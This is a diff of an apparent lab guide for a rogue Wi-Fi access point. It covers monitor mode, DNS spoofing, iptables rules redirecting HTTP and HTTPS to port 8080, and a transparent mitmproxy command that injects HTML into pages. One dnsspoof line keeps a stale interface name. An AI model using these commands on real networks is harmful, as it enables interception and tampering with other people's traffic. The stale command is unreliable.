@@ -52,17 +52,17 @@ Ex.
 **sudo** airmon-ng check
 
 ## Enable monitor mode on wifi interface to be used
-The interface will be referred to as `wlp4s0`.
+The interface will be referred to as `wlan1`.
 
-`airmon-ng start wlp4s0`
+`airmon-ng start wlan1`
 
-This will create temporarily create a new interface wlp4s0**mon**.
+This will create temporarily create a new interface wlan1**mon**.
 We will be referring to interface using this new name.
 
 ## Route Table and Gateway
 
 ```
-ifconfig wlp4s0mon up 192.168.1.1 netmask 255.255.255.0
+ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
 ```
 
@@ -74,7 +74,7 @@ connecting computers internet access.
 If you do, this step will require an additional interface
 that is connected to the internet.
 
-For this example, that interface will be referred to as `eth0`,
+For this example, that interface will be referred to as `wlan0`,
 but the interface can be specified as a wireless card too.
 
 This step modifies the firewall of the machine temporarily
@@ -99,15 +99,19 @@ In these instructions, we will be setting up a NAT.
 Run the following commands:
 
 ```
-iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
-iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --append FORWARD --in-interface wlan1mon -j ACCEPT
+iptables --table nat --append PREROUTING -i wlan1mon -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables --table nat --append PREROUTING -i wlan1mon -p tcp --dport 443 -j REDIRECT --to-port 8080
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 To undo these commands:
 ```
-iptables --table nat --delete POSTROUTING --out-interface eth0 -j MASQUERADE
-iptables --delete FORWARD --in-interface wlan0mon -j ACCEPT
+iptables --table nat --delete POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --delete FORWARD --in-interface wlan1mon -j ACCEPT
+iptables --table nat --delete PREROUTING -i wlan1mon -p tcp --dport 80 -j REDIRECT --to-port 8080
+iptables --table nat --delete PREROUTING -i wlan1mon -p tcp --dport 443 -j REDIRECT --to-port 8080
 echo 0 > /proc/sys/net/ipv4/ip_forward
 ```
 
@@ -118,8 +122,8 @@ terminal.
 
 ```
 hostapd hostapd.conf
-dnsmasq -C dnsmasq.conf -d
-dnsspoof -i wlp4s0mon
+dnsmasq -C dnsmasq.conf
+dnsspoof -i wlp4s0mon # didnt run this but it worked anyways
 ```
 
 ## Deauthenticating Client
@@ -159,5 +163,8 @@ https://charlesreid1.com/wiki/MITM/Traffic_Injection
 Our example will perform an HTML Injection that flips the web content
 the user is trying to view.
 
-TODO: still need to work on this bit
+```
+mitmproxy --set tls_version_client_min=SSL3 --mode transparent --showhost -s flip.py
+
+```
 
